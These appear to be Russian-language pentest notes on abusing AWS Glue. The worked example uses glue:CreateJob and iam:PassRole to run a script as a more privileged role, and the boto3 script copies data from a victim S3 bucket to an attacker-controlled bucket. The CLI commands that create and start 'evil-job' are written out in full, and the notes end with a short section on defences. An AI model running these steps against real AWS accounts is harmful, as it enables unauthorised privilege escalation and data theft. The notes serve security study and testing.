# Core

**AWS Glue** ‚Äî —ç—Ç–æ –ø–æ–ª–Ω–æ—Å—Ç—å—é —É–ø—Ä–∞–≤–ª—è–µ–º—ã–π —Å–µ—Ä–≤–∏—Å –¥–ª—è **ETL (Extract, Transform, Load)**:

- **Extract** ‚Äî –∏–∑–≤–ª–µ–∫–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ —Ä–∞–∑–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ (S3, RDS, Redshift, JDBC –∏ –¥—Ä.).
- **Transform** ‚Äî –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∏ –æ—á–∏—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, —á–µ—Ä–µ–∑ PySpark-—Å–∫—Ä–∏–ø—Ç—ã).
- **Load** ‚Äî –∑–∞–≥—Ä—É–∂–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –≤ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ S3 –∏–ª–∏ Redshift) –¥–ª—è –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –∏–ª–∏ Machine Learning.

**–°—Ü–µ–Ω–∞—Ä–∏–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:**

- –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ (Athena, ML, Redshift).
- –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Ä–∞–∑–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ –¥–∞–Ω–Ω—ã—Ö.
- –ö–∞—Ç–∞–ª–æ–≥–∏–∑–∞—Ü–∏—è (—á–µ—Ä–µ–∑ Glue Data Catalog ‚Äî –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ —Ç–∞–±–ª–∏—Ü –∏ –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö).

---

# üõ° Glue –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ AWS Pentest

## üìç –ß—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ —Å —Ç–æ—á–∫–∏ –∑—Ä–µ–Ω–∏—è –∞—Ç–∞–∫—É—é—â–µ–≥–æ:

1. **–î–æ—Å—Ç—É–ø –∫ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–º –¥–∞–Ω–Ω—ã–º**
    - Glue —á–∞—Å—Ç–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤—É–µ—Ç —Å S3-–±–∞–∫–µ—Ç–∞–º–∏, RDS, Redshift.
    - –°–∫—Ä–∏–ø—Ç—ã –∏ –ø–∞–π–ø–ª–∞–π–Ω—ã –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å **—Å–µ–∫—Ä–µ—Ç—ã, –∫–ª—é—á–∏, —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ**, hardcoded credentials.
    - –ù–∞–ø—Ä–∏–º–µ—Ä, –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —Å–∫—Ä–∏–ø—Ç –≤ Glue Job —Å `aws_access_key_id` –∏ `aws_secret_access_key`.
2. **Privilege Escalation —á–µ—Ä–µ–∑ —Ä–æ–ª–∏**
    - Glue jobs —á–∞—Å—Ç–æ –∑–∞–ø—É—Å–∫–∞—é—Ç—Å—è –æ—Ç **IAM —Ä–æ–ª–∏**.
    - –ï—Å–ª–∏ —Ç—ã –º–æ–∂–µ—à—å **—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å –∏–ª–∏ –∑–∞–ø—É—Å–∫–∞—Ç—å Glue Job**, —Ç–æ —Ç—ã –º–æ–∂–µ—à—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–æ–ª—å, –ø—Ä–∏–∫—Ä–µ–ø–ª—ë–Ω–Ω—É—é –∫ Glue.
    - –ï—Å–ª–∏ —É —ç—Ç–æ–π —Ä–æ–ª–∏ –±–æ–ª—å—à–µ –ø—Ä–∞–≤ ‚Äî üí• privilege escalation.
3. **Access Misconfiguration**
    - –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∏–º–µ–µ—Ç –ø—Ä–∞–≤–æ –Ω–∞ `glue:*`, —ç—Ç–æ –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ admin.
    - –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤–æ–∑–Ω–∏–∫–∞–µ—Ç, –µ—Å–ª–∏ —É —Ç–µ–±—è –µ—Å—Ç—å `glue:CreateJob` + `iam:PassRole`, –¥–∞–∂–µ —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–π —Ä–æ–ª—å—é, —Ç—ã –º–æ–∂–µ—à—å –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–æ–¥ –æ—Ç –∏–º–µ–Ω–∏ —Ä–æ–ª–∏ —Å –≤—ã—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏.
4. **–ö–æ–¥–æ–≤–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ**
    - Glue job –º–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å —Å–æ —Å–≤–æ–∏–º —Å–∫—Ä–∏–ø—Ç–æ–º –Ω–∞ Python (PySpark).
    - –ï—Å–ª–∏ —Ç—ã –º–æ–∂–µ—à—å –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–≤–æ–π –∫–æ–¥ ‚Üí –º–æ–∂–µ—à—å —ç–∫—Å—Ñ–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ, –≤—ã–ø–æ–ª–Ω–∏—Ç—å –±—ç–∫–∞–ø, –ø—Ä–æ—Å–∫–∞–Ω–∏—Ç—å —Å–µ—Ç—å, –∑–∞–ª–∏—Ç—å —à–µ–ª–ª –≤ S3 –∏ —Ç.–¥.

---

## üîç –ß—Ç–æ –∏—Å–∫–∞—Ç—å –ø—Ä–∏ –ø–µ–Ω—Ç–µ—Å—Ç–µ:

| –¶–µ–ª—å | –ß—Ç–æ –∏—Å–∫–∞—Ç—å | –ü–æ—á–µ–º—É –≤–∞–∂–Ω–æ |
| --- | --- | --- |
| **Glue Jobs** | `aws glue get-jobs`, `aws glue get-job --name your-job` | –ü–æ–ª—É—á–∏—Ç—å —Å–∫—Ä–∏–ø—Ç, –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã |
| **Data Catalog** | `aws glue get-databases`, `aws glue get-tables` | –í–∏–¥–Ω–æ, –∫–∞–∫–∏–µ –±–∞–∑—ã –∏ —Ç–∞–±–ª–∏—Ü—ã –µ—Å—Ç—å |
| **Permissions** | `iam list-policies`, `glue:CreateJob`, `glue:StartJobRun`, `iam:PassRole` | –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –∏ –∑–∞–ø—É—Å–∫–∞ –∫–æ–¥–∞ |
| **Connections** | `aws glue get-connections` | JDBC-—Å—Å—ã–ª–∫–∏, –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ creds –∫ –ë–î |

# –ü—Ä–∏–º–µ—Ä –∞—Ç–∞–∫–∏ —á–µ—Ä–µ–∑ Glue Job

## üìå –ü—Ä–µ–¥–ø–æ—Å—ã–ª–∫–∏:

–¢—ã **—É–∂–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–ª IAM-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è**, —É –∫–æ—Ç–æ—Ä–æ–≥–æ –µ—Å—Ç—å —Ç–∞–∫–∏–µ –ø—Ä–∞–≤–∞:

- `glue:CreateJob`
- `glue:StartJobRun`
- `iam:PassRole` (–Ω–∞ Glue Service Role, —Å –¥–æ—Å—Ç—É–ø–æ–º –∫ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–º—É S3-–±–∞–∫–µ—Ç—É)

---

### üß™ –®–∞–≥ 1: –ü–∏—à–µ–º PySpark —Å–∫—Ä–∏–ø—Ç

–ü—Ä–∏–º–µ—Ä —Å–∫—Ä–∏–ø—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π —á–∏—Ç–∞–µ—Ç –∏–∑ S3 –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ç–µ–±–µ (–∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –ø–∏—à–µ—Ç –≤ –¥—Ä—É–≥–æ–π –±–∞–∫–µ—Ç):

```python
import boto3

def upload_data():
    s3 = boto3.client('s3')
    bucket = 'target-victim-bucket'
    key = 'secret-data.txt'

    # —á–∏—Ç–∞–µ–º —Ñ–∞–π–ª (–∏–ª–∏ —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤)
    obj = s3.get_object(Bucket=bucket, Key=key)
    data = obj['Body'].read().decode('utf-8')

    # –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–µ–±–µ ‚Äî –Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ —Ç–≤–æ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –±–∞–∫–µ—Ç
    s3.put_object(Bucket='attacker-bucket', Key='loot.txt', Body=data)

upload_data()
```

> üîê –¢—ã –º–æ–∂–µ—à—å —Ç–∞–∫–∂–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –≤—Å—ë —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±–∞–∫–µ—Ç–∞, –µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—à—å list_objects_v2.
> 

---

### üõ† –®–∞–≥ 2: –°–æ–∑–¥–∞—ë—à—å Glue Job

```bash
aws glue create-job \
  --name evil-job \
  --role arn:aws:iam::victim:role/GlueServiceRoleWithS3Access \
  --command '{"Name":"glueetl","ScriptLocation":"s3://attacker-bucket/evil_script.py","PythonVersion":"3"}' \
  --region your-region
```

üëâ –¢–µ–±–µ –Ω–∞–¥–æ –∑–∞—Ä–∞–Ω–µ–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Å–∫—Ä–∏–ø—Ç `evil_script.py` –≤ **—Ç–≤–æ–π S3**.

---

### üöÄ –®–∞–≥ 3: –ó–∞–ø—É—Å–∫–∞–µ—à—å Job

```bash
aws glue start-job-run --job-name evil-job
```

–ï—Å–ª–∏ –≤—Å—ë –ø—Ä–æ–∫–∞—Ç–∏–ª–æ ‚Äî —Å–∫—Ä–∏–ø—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –æ—Ç –∏–º–µ–Ω–∏ **—Ç–æ–π —Ä–æ–ª–∏**, –∫–æ—Ç–æ—Ä—É—é —Ç—ã –ø–µ—Ä–µ–¥–∞–ª –≤ `--role`, –∞ –Ω–µ –æ—Ç —Ç–≤–æ–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –≠—Ç–æ –∏ –µ—Å—Ç—å **Privilege Escalation** + **Data Exfiltration**.

---

## üîê –ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è (–µ—Å–ª–∏ –≤–¥—Ä—É–≥ —Ç—ã –ø–æ –¥—Ä—É–≥—É—é —Å—Ç–æ—Ä–æ–Ω—É):

- –ù–∏–∫–æ–≥–¥–∞ –Ω–µ –¥–∞–≤–∞—Ç—å `iam:PassRole` –±–µ–∑ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π
- –í—Å–µ–≥–¥–∞ –ø—Ä–æ–≤–µ—Ä—è—Ç—å, –∫–∞–∫–∏–µ —Ä–æ–ª–∏ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Glue
- –ú–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å —Å–∫—Ä–∏–ø—Ç—ã –∏ –∑–∞–ø—É—Å–∫ Job-–æ–≤ (CloudTrail)
- –ò–∑–æ–ª–∏—Ä–æ–≤–∞—Ç—å –≤–∞–∂–Ω—ã–µ S3-–±–∞–∫–µ—Ç—ã –Ω–∞ —É—Ä–æ–≤–Ω–µ bucket policy
